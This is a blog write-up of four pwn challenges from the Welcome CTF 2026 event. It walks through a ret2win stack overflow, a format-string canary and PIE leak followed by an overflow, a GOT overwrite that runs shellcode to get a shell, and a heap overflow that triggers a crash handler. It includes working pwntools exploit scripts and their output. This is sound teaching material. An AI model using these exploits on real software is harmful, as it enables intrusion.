---
title: "Welcome CTF 2026 WriteUp"
date: 2026-08-22 09:00:00 +0800
categories: [CTF WriteUps]
tags: [pwn, stack_exploitation]
---

# Welcome CTF 2026

## 0. Welcome CTF 2026 Overview

A write up on the pwn challenges Welcome CTF hosted by NUS greyhats. It has been some time since my last CTF, thus I decided to see what the CTF had to offer.

## 1. Stack BOF school

### Analysis of the Binary

Checksec:

```bash
$ checksec --file=./challenge
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH   Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   55 Symbols     No    0               2               ./challenge
```

Executing the binary:

```bash
                     stack memory             
        ┌─────────────────────────┬──────────┐
        │                         │          │
        │ 00 00 00 00 00 00 00 00 │ ........ │ <---- RSP (stack pointer)
        │                         │          │
        │ 02 00 00 00 10 40 00 00 │ .....@.. │
        │                         │          │
        │ 21 01 00 00 ff fb eb bf │ !....... │
        │                         │          │
        │ 00 00 00 00 00 00 00 00 │ ........ │
        │                         │          │
        │ 00 00 00 00 00 00 00 00 │ ........ │
        │                         │          │
        │ 00 00 00 00 00 00 00 00 │ ........ │
        │                         │          │
        │ 40 65 6b b1 fd 7f 00 00 │ @ek..... │ <---- RBP (base pointer)
        │                         │          │
        │ 55 1a 40 00 00 00 00 00 │ U.@..... │ <---- return address [0x401a55]
        │                         │          │
        └─────────────────────────┴──────────┘
        win function @ 0x401608

        press enter to terminate your input

        to insert a byte based on the hex value, prefix it with a '\' character
        (i.e.) typing \41 will produce A

        input: 

```

Analysis:

- The binary shows us the view of the stack at the point of execution.
- Reveals the stack pointer, base pointer, return address and `win`’s address in memory

### Exploiting the Binary:

Given that the binary shows us the view of the stack, it shows us the number of bytes required to reach the return address 56 bytes. 

Performing `checksec` also tells us that this binary does not have PIE enabled or stack canary enabled. 

- The memory address of `win` is fixed and can be hardcoded.
- No memory leak is needed to overwrite to the return address.

Execution of exploit:

```bash
                     stack memory             
        ┌─────────────────────────┬──────────┐
        │                         │          │
        │ 00 00 00 00 00 00 00 00 │ ........ │ <---- RSP (stack pointer)
        │                         │          │
        │ 02 00 00 00 10 40 00 00 │ .....@.. │
        │                         │          │
        │ 21 01 00 00 ff fb eb bf │ !....... │
        │                         │          │
        │ 00 00 00 00 00 00 00 00 │ ........ │
        │                         │          │
        │ 00 00 00 00 00 00 00 00 │ ........ │
        │                         │          │
        │ 00 00 00 00 00 00 00 00 │ ........ │
        │                         │          │
        │ 40 65 6b b1 fd 7f 00 00 │ @ek..... │ <---- RBP (base pointer)
        │                         │          │
        │ 55 1a 40 00 00 00 00 00 │ U.@..... │ <---- return address [0x401a55]
        │                         │          │
        └─────────────────────────┴──────────┘
        win function @ 0x401608

        press enter to terminate your input

        to insert a byte based on the hex value, prefix it with a '\' character
        (i.e.) typing \41 will produce A

        input: \41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\41\08\16\40
        
        returning to --> 0x401608

        you got your first ret2win!
				grey{FLAG_FOR_TESTING}
```

Analysis:

- By entering 56 padding bytes of `\41`
- Overwrite the stack’s return address with the  `win` function’s memory address in raw bytes and in Little endian `\08\16\40`. This is because `x86` and `x86-64` processors the stack stores bytes in Little endian format.

More information about the stack and how it stores data:

- When a function is called, a **stack frame** is carved out of memory.
- The stack frame frame is a static collection of predefined slots (chunks) of memory allocated for that function's local variables, saved registers, and the return address. Upon execution, these chunks’ sizes are fixed.
    - Example: A chunk allocated on the stack for the return address will always be 8 bytes.
- If a 1 byte variable is stored on the stack, depending on what is stored on the stack after, the compiler compiler will pad different number of bytes for stack alignment.
    - Example: 1 byte follows → no padding, 4 or 8 bytes follows → 3 or 7 padding
- Little endian formatting only reverses the bytes of each **variable** **independently** based on its actual declared size.
    - 1-byte char: There is nothing to reverse. It stays exactly as 1 byte.
    - 2-byte short: Reverses just those 2 bytes (e.g. `0x1234` becomes `34 12`).
    - 4-byte int: Reverses all 4 bytes (e.g., `0x12345678` becomes `78 56 34 12`).
    - 8-byte long/pointer: Reverses all 8 bytes (e.g., `0x1122334455667788` becomes `88 77 66 55 44 33 22 11`).
    - Example: A 2 byte short is next to a 1 byte char on the stack. The Little endian rule applies strictly to that 2 byte chunk, not the arbitrary 4 byte block that contains these 2 variables. Chronologically, the 2 byte short will still be at a lower memory address than the 1 byte char in memory.

Result:

`grey{d1d_y0u_n0t1ce_m3m0ry_1n_l1ttl3_3nd14n_and_the_difference_between_raw_bytes_and_their_hex_representations?}`

## 2. Last pack magic:

### Analysis of the Binary

Checksec:

```bash
bz@Bing-Zhe:~/Documents/Cybersecurity/01_CTFs/Welcome_2026/Pwn/dist-last_pack_magic$ checksec --file=./chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH   Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   52 Symbols     No    0               3               ./chall
```

File:

```bash
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cb93435a3d58a403d421505bbb7daa299b2b6ad9, for GNU/Linux 3.2.0, not stripped
```

Analysis:

- Dynamically linked.
- It relies on shared library files (like `.so` files on Linux)

Source code:

```bash
// gcc ./chall.c -o chall
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>

void setup() {
    setbuf(stdin, 0);
	setbuf(stdout, 0);
}

// can you find a way to trigger this function?
void win() {
    // print flag
    int flag_fd = open("flag.txt", O_RDONLY);
    if (flag_fd == -1) {
        printf("Error reading flag.");
        exit(1);
    }
    char buf[0x50];
    read(flag_fd, buf, 0x50);
    write(1, buf, 0x50);
}

char *rarities[] = {"common", "uncommon", "IR", "SIR"};

int main() {
    setup();
    srand(1337);
    char greeting_buf[100] = "It's the last pack for ";
    printf("Enter name: ");
    read(0, greeting_buf + 23, 20);
    printf(greeting_buf);
    printf("What will you get? Enter your prediction: ");
    char prediction[100];
    fgets(prediction, 0x100, stdin);
    int num_SIRs = 0;
    for (int i = 0; i < 5; i++) {
        int cur_card = rand() % 4;
        if (!strncmp(rarities[cur_card], "SIR", 3)) {
            num_SIRs++;
        }
        printf("Card %i: Greycat %s!\n", i+1, rarities[cur_card]);
    }
    printf("You hit %i SIRs!\n", num_SIRs);
    if (num_SIRs == 5) {
        printf("Congratulations! You hit the god pack! Ding ding ding!\n");
        win();
    }
    return 0;
}
```

### Enumerating the Docker environment:

Dockerfile:

```bash
$ cat Dockerfile 
FROM ubuntu:22.04 AS app

FROM pwn.red/jail

COPY --from=app / /srv
COPY ./chall /srv/app/run
COPY ./flag.txt /srv/app/flag.txt
```

Analysis:

- Since the binary is dynamically linked, hence the dependencies have to be extracted from the docker instance
- Using the `ubuntu:22.04` image

Extracting the dependencies:

```bash
/target_rootfs $ tree -L 2
.
├── lib
│   └── x86_64-linux-gnu
└── lib64
    └── ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```

Running `patchelf` on the binaries:

```bash
patchelf --set-interpreter "target_rootfs/lib64/ld-linux-x86-64.so.2" --set-rpath 'target_rootfs/lib/x86_64-linux-gnu' ./chall -o chall_patched
```

Analysis:

- This patches the binary to use the exported dependencies instead of the dependencies native to your operating system

A mistake I made:

I did not `patchelf` the binary initially. This affected the values on the stack at the point of the memory leak. This caused my initial exploit to fail, since the values were at different offsets within the stack.

### Vulnerabilities within the Binary:

Format string vulnerability:

```c
read(0, greeting_buf + 23, 20);
printf(greeting_buf);
```

Analysis:

- `printf` does not specify a format string
- This results in a format string vulnerability, where arbitrary information can be read from the stack at the point of the `printf`

Buffer overflow vulnerability:

```c
char prediction[100];
fgets(prediction, 0x100, stdin);
```

Analysis:

- `fgets` reads in 256 bytes from `stdin` and places it within `predictions` buffer.
- Since `predictions` buffer can store only 100 bytes, `fgets()` has a buffer overflow vulnerability

### Exploiting the Binary:

#### Leaking information using printf vulnerability

Agenda for leaking the stack canary:

- By exploiting the `printf` vulnerability, I am able to leak the values of the stack canary which is loaded on `main`’s stack frame — to protect `main`’s return address.
- This way, when overflowing the buffer to perform a ret2win, instead of hitting the stack canary causing a stack smashing error, I can overwrite it with the canary value of the current run.
- This allows me to overwrite the return address, and direct the control flow into the `win` function

Agenda for leaking `main`’s address:

- The next step is to direct it to the `win` function
- In order to do that, I need to obtain `win`’s memory address.
- The issue is that, PIE is enabled. Hence, unlike before `win`’s memory address cannot be hardcoded.
- Since a `printf` vulnerability exists, I can leak stack addresses within `.text` and use them to calculate `win`'s address. PIE/ASLR only randomizes each region's base address — since offsets within `.text` stay constant.

`calibrate.py`:

```bash
$ cat calibrate.py 
from pwn import *

def spawn():
    return process("./chall_patched")

for i in range(0, 80):
    target = spawn()
    target.recvuntil(b"Enter name: ")
    target.sendline(f"%{i}$p".encode())
    line = target.recvuntil(b"\n")
    print(i, line)
    target.close()
```

Analysis:

- Using a python script to inject `%{i}$p` where `i` cycles through 0 to 80, it leaks memory at different offsets on the stack.
- Using the `%p` format string, I am able to leak 8 byte sequences

Running this with no ASLR:

```bash
$ setarch "$(uname -m)" -R python3 calibrate.py
```

Results:

```bash
[+] Starting local process './chall_patched': pid 21749
35 b"It's the last pack for 0xeb9556d113960e00\n"      
[*] Stopped process './chall_patched' (pid 21749)  

[+] Starting local process './chall_patched': pid 21757
39 b"It's the last pack for 0x55555555537a\n"          
[*] Stopped process './chall_patched' (pid 21757)  
```

Reason for running the script with ASLR turned off:

- Allows for easy identification of the stack canary value and the memory address within the `.text` region

Analysis of results:

- Stack canaries can generically be identified by a string of bytes ending with a null byte `/x00`, hence a promising candidate is the value stored within the stack at an offset of 35
- Memory addresses for `x86-64`, within the `.text` region are usually loaded with a base address of the form `0x5555xxxxx000`, hence a promising candidate is the value stored within the stack at an offset of 39. Using `gdb` to check, this address within `main`.

Calculating the offset of `win` from the leaked address:

```bash
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000555555555000  _init
0x00005555555550f0  __cxa_finalize@plt
0x0000555555555100  strncmp@plt
0x0000555555555110  puts@plt
0x0000555555555120  write@plt
0x0000555555555130  __stack_chk_fail@plt
0x0000555555555140  setbuf@plt
0x0000555555555150  printf@plt
0x0000555555555160  read@plt
0x0000555555555170  srand@plt
0x0000555555555180  fgets@plt
0x0000555555555190  open@plt
0x00005555555551a0  exit@plt
0x00005555555551b0  rand@plt
0x00005555555551c0  _start
0x00005555555551f0  deregister_tm_clones
0x0000555555555220  register_tm_clones
0x0000555555555260  __do_global_dtors_aux
0x00005555555552a0  frame_dummy
0x00005555555552a9  setup
0x00005555555552dc  win
0x000055555555537a  main
```

Calculating offset of leaked address to `win`:

```
offset = 0x55555555537a - 0x5555555552dc
```

#### Calculating buffer overflow offset:

Set a breakpoint after `fgets`:

```bash
   0x000055555555549e <+292>:   call   0x555555555150 <printf@plt>            
   0x00005555555554a3 <+297>:   mov    rdx,QWORD PTR [rip+0x2ba6]        # 0x555555558050 <stdin@GLIBC
_2.2.5>                                            
   0x00005555555554aa <+304>:   lea    rax,[rbp-0x70]             
   0x00005555555554ae <+308>:   mov    esi,0x100                                                      
   0x00005555555554b3 <+313>:   mov    rdi,rax                                                        
   0x00005555555554b6 <+316>:   call   0x555555555180 <fgets@plt>             
   0x00005555555554bb <+321>:   mov    DWORD PTR [rbp-0xec],0x0
   0x00005555555554c5 <+331>:   mov    DWORD PTR [rbp-0xe8],0x0 
```

```c
    printf("What will you get? Enter your prediction: ");
    char prediction[100];
    fgets(prediction, 0x100, stdin);
```

Taking a look at the stack after inputting `aaaa`:

```c
0x7fffffffd920: 0x61616161      0x0000000a      0x00000001      0x00000000
0x7fffffffd930: 0x55554040      0x00005555      0xf7fe283c      0x00007fff
0x7fffffffd940: 0x00000e30      0x00000000      0xffffde79      0x00007fff
0x7fffffffd950: 0xf7fc1000      0x00007fff      0x01000000      0x00000101
0x7fffffffd960: 0x00000002      0x00000000      0xbfebfbff      0x00000000
0x7fffffffd970: 0xffffde89      0x00007fff      0x00000064      0x00000000
0x7fffffffd980: 0x00001000      0x00000000      0x0b885500      0xbd5b338b
```

Analysis:

- Setting breakpoint: `break *0x00005555555554c5`
- From this, I can tell that there are 104 bytes the start of the `prediction` buffer to the highlighted stack canary.

#### Proof of Concept:

`solve.py`:

```python
from pwn import *

target = remote("challs.nusgreyhats.org", 32001)
#target = process("./chall _patched")

output = target.recvuntil("Enter name: ")
print(output)

target.sendline("%35$p %39$p")
canary_line = target.recvuntil("\n")
canary = canary_line.split(b" ")[5]
print(f"Canary value = {canary}")
main_addr = canary_line.split(b" ")[6].strip(b"\n")
print(f"Main address = {main_addr}")
canary_value = p64(int(canary,16))
win_addr = p64(int(main_addr, 16) - (0x55555555537a - 0x5555555552dc))
output = target.recvuntil("Enter your prediction: ")
print(output)

# Building payload
payload = b""
# Padding
payload += b"A" * 104
# Adding the canary
payload += canary_value
# Padding the rbp
payload += b"A" * 8
# Adding the win address
payload += win_addr

target.sendline(payload)
output = target.recvall()
print(output)
```

Results:

```bash
[*] Process './chall_patched' stopped with exit code -11 (SIGSEGV) (pid 106637)
b'Card 1: Greycat uncommon!\nCard 2: Greycat IR!\nCard 3: Greycat SIR!\nCard 4: Greycat SIR!\nCard 5: Greycat IR!\nYou hit 2 SIRs!\ngrey{testflag}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
```

## 3. Write-what-where

### Analysis of the binary

Checksec:

```bash
/Pwn/dist-write_what_where$ checksec --file=./chall_patched
[*] '/home/bz/Documents/Cybersecurity/01_CTFs/Welcome_2026/Pwn/dist-write_what_where/chall_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Source code:

```c
// gcc ./chall.c -no-pie -o chall
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

void setup() {
    setbuf(stdin, 0);
        setbuf(stdout, 0);
}

void* get_shellcode() {
    void* shellcode_addr = mmap(0, 0x31, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("Your shellcode's address is %p\n", shellcode_addr);
    printf("Send your shellcode (max 48 bytes): \n");
    scanf("%48s", shellcode_addr);
    printf("Your shellcode is: ");
    for (int i = 0; i < 48; i++) {
        printf("%02X ", ((unsigned char *) shellcode_addr)[i]);
    }
    printf("\n");
    return shellcode_addr;
}

int main() {
    setup();
    void* shellcode_addr = get_shellcode();
    void** target_addr = 0;
    printf("Where do you want to write your shellcode's address to? Enter your answer in hex, e.g. 0x404030: \n");
    scanf("%p", &target_addr);
    printf("Writing your shellcode's address to %p...\n", target_addr);
    *target_addr = shellcode_addr;
    printf("Done! Wrote %p to %p\n", shellcode_addr, target_addr);
    return 0;
}
```

### Enumerating the Docker environment:

Dockerfile:

```bash
$ cat Dockerfile 
FROM ubuntu:22.04 AS app

FROM pwn.red/jail

COPY --from=app / /srv
COPY ./chall /srv/app/run
COPY ./flag.txt /srv/app/flag.txt
```

Analysis:

- Since the binary is dynamically linked, hence the dependencies have to be extracted from the docker instance
- Using the `ubuntu:22.04` image

Running `patchelf` on the binaries:

```bash
patchelf --set-interpreter "target_rootfs/lib64/ld-linux-x86-64.so.2" --set-rpath 'target_rootfs/lib/x86_64-linux-gnu' ./chall -o chall_patched
```

Analysis:

- Running the same command on this binary since the docker environment is the same

### Vulnerabilities within the binary

Free arbitrary write to any region of memory:

```c
void* get_shellcode() {
    void* shellcode_addr = mmap(0, 0x31, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("Your shellcode's address is %p\n", shellcode_addr);
    printf("Send your shellcode (max 48 bytes): \n");
    scanf("%48s", shellcode_addr);
    printf("Your shellcode is: ");
    for (int i = 0; i < 48; i++) {
        printf("%02X ", ((unsigned char *) shellcode_addr)[i]);
    }
    printf("\n");
    return shellcode_addr;
}
```

Analysis:

- The binary uses `mmap` to request a new region of memory that is both writable and executable, rather than searching for an existing one
- The binary accepts 48 bytes of user input and writes it into this region, then returns and outputs the start address of this region to the user
- This suggests the binary is designed to redirect control flow into that region, since it provides the user with a way to plant shellcode at a known, executable address

Writing to that region of memory:

```c
    printf("Where do you want to write your shellcode's address to? Enter your answer in hex, e.g. 0x404030: \n");
    scanf("%p", &target_addr);
    printf("Writing your shellcode's address to %p...\n", target_addr);
    *target_addr = shellcode_addr;
    printf("Done! Wrote %p to %p\n", shellcode_addr, target_addr);
```

Analysis:

- The binary accepts an arbitrary memory address from the user, then writes `shellcode_addr`  to that location
- This is an arbitrary-address write, but not a fully arbitrary write: the *value* written is fixed to `shellcode_addr` but not attacker-controlled

No PIE → GOT table overwrite:

- The binary has PIE disabled, this means that regions of memory such as the GOT table are not affected by ASLR and have hardcoded memory addresses.
- In addition, the challenge hinted at a GOT table overwrite.
- This means that I can use the previously discovered write primitive to overwrite the GOT table entry for the `printf` function with the `shellcode_addr` redirecting the control flow to the shellcode and obtaining a shell.

Finding the GOT table entry for `printf`:

```bash
$ objdump -R ./chall_patched | grep printf
0000000000404040 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
```

Analysis:

- GOT table entry for `printf` is at `0x404040`

### Exploiting the Binary

#### Proof of Concept

`solve.py`:

```python
from pwn import *

#target = process("./chall_patched")
target = remote("challs.nusgreyhats.org", 32002)

output = target.recvuntil("(max 48 bytes): \n")
print(output)

# generating shellcode with pwntools
context.update(arch='amd64', os='linux')
shellcode = asm(shellcraft.sh())

print(f"Shellcode: {shellcode}")
target.sendline(shellcode)
output = target.recvuntil("0x404030: \n")
print(output)

target.sendline(b"0x404040")
target.interactive()
```

Results:

```bash
b"Your shellcode is: 6A 68 48 B8 2F 62 69 6E 2F 2F 2F 73 50 48 89 E7 68 72 69 01 01 81 34 24 01 01 01 01 31 F6 56 6A 08 5E 48 01 E6 56 48 89 E6 31 D2 6A 3B 58 0F 05 \nWhere do you want to write your shellcode's address to? Enter your answer in hex, e.g. 0x404030: \n"
[*] Switching to interactive mode
Writing your shellcode's address to 0x404040...
$ cat flag.txt
grey{testflag}
```

## 4. n00bcaks last straw:

### Analysis of the binary:

Source Code:

```c
// gcc ./chall.c -o chall
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>

#define MAX_STRAWS 0x10
#define DATA_SIZE 0x40

void setup() {
    setbuf(stdin, 0);
	setbuf(stdout, 0);
}

struct straw {
    struct straw* next_ptr;
    char data[DATA_SIZE];
};

int num_straws = 1;
struct straw* init_straw;

// can you find a way to trigger this function?
void win(int sig) {
    int flag_fd = open("flag.txt", O_RDONLY);
    if (flag_fd == -1) {
        printf("Error reading flag.");
        exit(1);
    }
    char buf[0x30];
    read(flag_fd, buf, 0x30);
    write(1, buf, 0x30);
    exit(1);
}

void print_menu() {
    printf("=====================\n");
    printf("n00bcak's straw store\n");
    printf("How many straws would n00bcak store if n00bcak could store straws?\n");
    printf("=====================\n");
    printf("1. Create straw\n");
    printf("2. Edit straw\n");
    printf("3. Read straw\n");
    printf("> ");
}

void create_straw() {
    if (num_straws == MAX_STRAWS) {
        printf("[X] Too many straws! n00bcak can't store this many straws :(\n");
        return;
    }
    num_straws++;
    struct straw* last_straw = init_straw;
    while (last_straw->next_ptr != NULL) {
        last_straw = last_straw->next_ptr;
    }
    struct straw* new_straw = malloc(sizeof(struct straw));
    last_straw->next_ptr = new_straw;
    new_straw->next_ptr = NULL;
    strcpy(new_straw->data, "n00bcak's new straw");
    printf("[+] New straw created!\n");
}

void edit_straw(int straw_id) {
    struct straw* cur_straw = init_straw;
    for (int i = 0; i < straw_id; i++) {
        cur_straw = cur_straw->next_ptr;
    }
    printf("Enter new straw data: ");
    scanf("%72s", cur_straw->data);
    printf("[+] Straw edited!\n");
}

void read_straw(int straw_id) {
    struct straw* cur_straw = init_straw;
    for (int i = 0; i < straw_id; i++) {
        cur_straw = cur_straw->next_ptr;
    }
    printf("[+] Straw data: \n");
    write(1, cur_straw->data, 0x40);
}

int main() {
    setup();
    signal(SIGSEGV, win);
    init_straw = malloc(sizeof(struct straw));
    init_straw->next_ptr = NULL;
    strcpy(init_straw->data, "n00bcak's first straw");
    while (1) {
        print_menu();
        int choice;
        scanf("%i", &choice);
        if (choice < 1 || choice > 3) {
            printf("[X] Invalid option!\n");
            continue;
        }
        if (choice == 1) {
            create_straw();
            continue;
        }
        int straw_id;
        printf("Enter straw id: ");
        scanf("%i", &straw_id);
        if (straw_id >= num_straws || straw_id < 0) {
            printf("[X] Invalid straw id!\n");
            continue;
        }
        if (choice == 2) {
            edit_straw(straw_id);
        } else {
            read_straw(straw_id);
        }
    }
    return 0;
}
```

- Seems like there is a `signal()` that triggers `win()` on `SIGSEGV`

### Vulnerabilities within the Binary:

Buffer overflow vulnerability:

```c
// Within edit_straw function 
    printf("Enter new straw data: ");
    scanf("%72s", cur_straw->data);

// definition of a straw
#define DATA_SIZE 0x40
struct straw {
    struct straw* next_ptr;
    char data[DATA_SIZE];
};
```

Analysis:

- See that `edit_straw` which controls the data attribute of the `straw` object takes in 72 bytes of data
- The definition of `straw` struct only takes in `0x40` or 64 bytes of data
- There exists a buffer overflow vulnerability here

### Exploiting the Binary:

Given that the only goal is to perform a `SIGSEGV`, with the buffer overflow vulnerability alone, this can be achieved

Performing segfault using the buffer overflow: 

```python
$ ./chall
=====================
n00bcak's straw store
How many straws would n00bcak store if n00bcak could store straws?
=====================
1. Create straw
2. Edit straw
3. Read straw
> 1
[+] New straw created!
=====================
n00bcak's straw store
How many straws would n00bcak store if n00bcak could store straws?
=====================
1. Create straw
2. Edit straw
3. Read straw
> 2
Enter straw id: 1
Enter new straw data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAA
[+] Straw edited!
=====================
n00bcak's straw store
How many straws would n00bcak store if n00bcak could store straws?
=====================
1. Create straw
2. Edit straw
3. Read straw
> Enter straw id: Enter new straw data: [+] Straw edited!
=====================
n00bcak's straw store
How many straws would n00bcak store if n00bcak could store straws?
=====================
1. Create straw
2. Edit straw
3. Read straw
> 1
malloc(): corrupted top size
Aborted                    (core dumped) ./chall
```

Analysis:

- Create a new `straw` with its buffer overflows into adjacent heap metadata
- Then, the next `malloc` call upon creating a new `straw` that touches that corrupted chunk causes a program crash

Note:

- This did not succeed locally, but was able to succeed remotely
